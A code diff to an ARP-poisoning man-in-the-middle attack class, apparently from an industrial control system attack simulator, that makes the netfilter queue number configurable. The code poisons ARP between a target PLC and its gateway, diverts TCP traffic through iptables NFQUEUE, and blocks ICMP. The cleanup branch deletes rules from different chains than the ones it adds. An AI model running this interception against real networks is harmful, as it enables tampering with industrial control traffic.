@@ -48,7 +48,7 @@ class SeqMiTMAttack(SyncedAttack):
         Finally, it launches the thread that will examine all captured packets.
         """
         self.modify_ip_tables(True)
-
+        queue_number = self.intermediate_attack['queue_num']
         # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
         if self.intermediate_yaml['network_topology_type'] == "simple":
@@ -59,7 +59,6 @@ class SeqMiTMAttack(SyncedAttack):
         self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        queue_number = 1
         nfqueue_path = Path(__file__).parent.absolute() / "Seq_mitm_netfilter_queue.py"
         cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
 
@@ -105,19 +104,18 @@ class SeqMiTMAttack(SyncedAttack):
         pass
 
 
-    @staticmethod
-    def modify_ip_tables(append=True):
-
+    def modify_ip_tables(self, append=True):
+        queue_number = self.intermediate_attack['queue_num']
         if append:
-            os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num {queue_number}')
 
             os.system('iptables -A FORWARD -p icmp -j DROP')
             os.system('iptables -A INPUT -p icmp -j DROP')
             os.system('iptables -A OUTPUT -p icmp -j DROP')
         else:
 
-            os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num 1')
-            os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
+            os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num {queue_number}')
+            os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num {queue_number}')
 
             os.system('iptables -D FORWARD -p icmp -j DROP')
             os.system('iptables -D INPUT -p icmp -j DROP')
